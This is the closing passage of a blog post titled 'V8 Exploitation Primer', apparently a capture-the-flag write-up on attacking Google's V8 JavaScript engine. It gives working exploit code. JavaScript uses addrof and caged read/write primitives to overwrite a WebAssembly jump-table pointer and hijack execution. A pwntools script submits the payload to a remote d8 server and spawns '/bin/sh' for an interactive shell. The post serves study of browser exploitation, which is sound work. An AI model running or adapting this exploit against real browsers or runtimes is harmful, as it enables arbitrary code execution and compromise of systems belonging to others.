class=mi>0</span><span class=p>,</span><span class=mi>11</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>wasm_mod</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Module</span><span class=p>(</span><span class=nx>wasm_code</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>wasm_instance</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Instance</span><span class=p>(</span><span class=nx>wasm_mod</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>shell</span> <span class=o>=</span> <span class=nx>wasm_instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>shell</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>trigger</span> <span class=o>=</span> <span class=nx>wasm_instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>trigger</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>shell</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>instance_addr</span> <span class=o>=</span> <span class=nx>addrof</span><span class=p>(</span><span class=nx>wasm_instance</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>trusted_data</span> <span class=o>=</span> <span class=nx>caged_read</span><span class=p>(</span><span class=nx>instance_addr</span> <span class=o>+</span> <span class=mh>0x8</span><span class=nx>n</span><span class=p>).</span><span class=nx>high</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>jump_table_start</span> <span class=o>=</span> <span class=nx>caged_read</span><span class=p>(</span><span class=nx>trusted_data</span> <span class=o>+</span> <span class=mh>0x28</span><span class=nx>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>caged_write</span><span class=p>(</span><span class=nx>trusted_data</span> <span class=o>+</span> <span class=mh>0x28</span><span class=nx>n</span><span class=p>,</span> <span class=nx>jump_table_start</span> <span class=o>+</span> <span class=mh>0x9de</span><span class=nx>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;pwned&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>trigger</span><span class=p>();</span></span></span></code></pre></div></div><p>The python script for sending the exploit:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set context to suppress initial connection messages, can be changed to &#39;debug&#39; for more info</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># 1. Read the Javascript payload</span>
</span></span><span class=line><span class=cl>    <span class=n>js_file</span> <span class=o>=</span> <span class=s2>&#34;./t.js&#34;</span> <span class=c1># CHANGE THIS</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>js_file</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Could not find </span><span class=si>{</span><span class=n>js_file</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>js_file</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload_size</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Loaded </span><span class=si>{</span><span class=n>js_file</span><span class=si>}</span><span class=s2> | Size: </span><span class=si>{</span><span class=n>payload_size</span><span class=si>}</span><span class=s2> bytes&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Safety check based on the server code provided</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>payload_size</span> <span class=o>&gt;=</span> <span class=mi>20000</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>warning</span><span class=p>(</span><span class=s2>&#34;Payload size exceeds server limit (20000)!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 2. Establish Connection</span>
</span></span><span class=line><span class=cl>    <span class=c1># Use: python solve.py REMOTE HOST=1.2.3.4 PORT=1337</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>args</span><span class=o>.</span><span class=n>HOST</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>args</span><span class=o>.</span><span class=n>PORT</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=s2>&#34;Please provide HOST=... and PORT=... arguments for remote connection&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>HOST</span><span class=p>,</span> <span class=nb>int</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>PORT</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Local testing: assumes the server script is named &#39;challenge.py&#39; </span>
</span></span><span class=line><span class=cl>        <span class=c1># and &#39;d8&#39; exists in the current directory</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=s1>&#39;python3&#39;</span><span class=p>,</span> <span class=s1>&#39;start_d8.py&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 3. Interaction Logic</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Wait for: &#34;Enter solve script file size: &#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># We send the size as a string followed by a newline because the server uses input()</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>payload_size</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;Payload sent! Waiting for pwned signal...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;pwned&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;Signal received! Brace for shell..&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 4. Stream output (d8 execution results)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span></span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:686/1*2rsgLts364F8WngOyt7VQA.png alt></figure></p><p>References used in the process of writing this article:</p><ul><li><a href=https://exploitreversing.com/wp-content/uploads/2025/01/exploit_reversing_03.pdf target=_blank rel=noreferrer>Alexander Borges’ article about browser exploitation</a></li><li><a href=https://w1redch4d.github.io/post/intro-v8/ target=_blank rel=noreferrer>https://w1redch4d.github.io/post/intro-v8/</a></li><li><a href=https://phrack.org/issues/70/9 target=_blank rel=noreferrer>saelo’s excellent phrack article</a></li><li><a href=https://mwlik.github.io/2025-05-15-browser-exploitation-primer/ target=_blank rel=noreferrer>m411k’s browser exploitation primer</a></li><li><a href=https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/ target=_blank rel=noreferrer>https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a></li><li><a href=https://www.thenodebook.com/node-arch/v8-engine-intro target=_blank rel=noreferrer>https://www.thenodebook.com/node-arch/v8-engine-intro</a></li><li>all the v8 blog posts I linked throughout the article</li></ul></div><section class="flex flex-row flex-wrap justify-center pt-4 text-xl"><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://suleif0.github.io/posts/v8-primer/&amp;title=V8%20Exploitation%20Primer" title="Share on LinkedIn" aria-label="Share on LinkedIn"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://twitter.com/intent/tweet/?url=https://suleif0.github.io/posts/v8-primer/&amp;text=V8%20Exploitation%20Primer" title="Tweet on Twitter" aria-label="Tweet on Twitter"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
</a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://api.whatsapp.com/send?text=https://suleif0.github.io/posts/v8-primer/&amp;resubmit=true&amp;title=V8%20Exploitation%20Primer" title="Share via WhatsApp" aria-label="Share via WhatsApp"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4.0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3.0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2.0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2.0-101.7 82.8-184.5 184.6-184.5 49.3.0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5.0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8s-14.3 18-17.6 21.8c-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2s-9.7 1.4-14.8 6.9c-5.1 5.6-19.4 19-19.4 46.3.0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://pinterest.com/pin/create/bookmarklet/?url=https://suleif0.github.io/posts/v8-primer/&amp;description=V8%20Exploitation%20Primer" title="Pin on Pinterest" aria-label="Pin on Pinterest"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6.0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8.0 128.7-68.8 128.7-154.3.0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1.0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6.0-54.7 41.4-107.6 112-107.6 60.9.0 103.6 41.5 103.6 100.9.0 67.1-33.9 113.6-78 113.6-24.3.0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6.0-19-10.2-34.9-31.4-34.9-24.9.0-44.9 25.7-44.9 60.2.0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9.0 361.1.0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://reddit.com/submit/?url=https://suleif0.github.io/posts/v8-primer/&amp;resubmit=true&amp;title=V8%20Exploitation%20Primer" title="Submit to Reddit" aria-label="Submit to Reddit"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8.0-24.9-11.1-24.9-24.6.0-13.8 11.1-24.9 24.9-24.9 13.6.0 24.6 11.1 24.6 24.9.0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4.0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8.0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7.0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9.0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5.0 52.6 59.2 95.2 132 95.2 73.1.0 132.3-42.6 132.3-95.2.0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6.0-2.2-2.2-6.1-2.2-8.3.0-2.5 2.5-2.5 6.4.0 8.6 22.8 22.8 87.3 22.8 110.2.0 2.5-2.2 2.5-6.1.0-8.6-2.2-2.2-6.1-2.2-8.3.0zm7.7-75c-13.6.0-24.6 11.1-24.6 24.9.0 13.6 11.1 24.6 24.6 24.6 13.8.0 24.9-11.1 24.9-24.6.0-13.8-11-24.9-24.9-24.9z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.facebook.com/sharer/sharer.php?u=https://suleif0.github.io/posts/v8-primer/&amp;quote=V8%20Exploitation%20Primer" title="Share on Facebook" aria-label="Share on Facebook"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14.0 55.52 4.84 55.52 4.84v61h-31.28c-30.8.0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="mailto:?body=https://suleif0.github.io/posts/v8-primer/&amp;subject=V8%20Exploitation%20Primer" title="Send via email" aria-label="Send via email"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1-27.64 140.9 68.65 266.2 199.1 285.1 19.01 2.888 36.17-12.26 36.17-31.49l1e-4-.6631c0-15.74-11.44-28.88-26.84-31.24-84.35-12.98-149.2-86.13-149.2-174.2.0-102.9 88.61-185.5 193.4-175.4 91.54 8.869 158.6 91.25 158.6 183.2v16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98.0036c-7.299.0-13.2 4.992-15.12 11.68-24.85-12.15-54.24-16.38-86.06-5.106-38.75 13.73-68.12 48.91-73.72 89.64-9.483 69.01 43.81 128 110.9 128 26.44.0 50.43-9.544 69.59-24.88 24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3c0-149.2-133.9-265.632-287.3-235.57zM239.1 304.3c-26.47.0-48-21.56-48-48.05s21.53-48.05 48-48.05 48 21.56 48 48.05-20.6 48.05-48 48.05z"/></svg></span></a></section></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_posts/v8-primer/index.md data-oid-likes=likes_posts/v8-primer/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"></footer></article><div id=scroll-to-top class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200"><a href=#the-top class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex list-none flex-col sm:flex-row"><li class="flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/tags/ title=Tags>Tags</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2026
suleif</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://suleif0.github.io/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>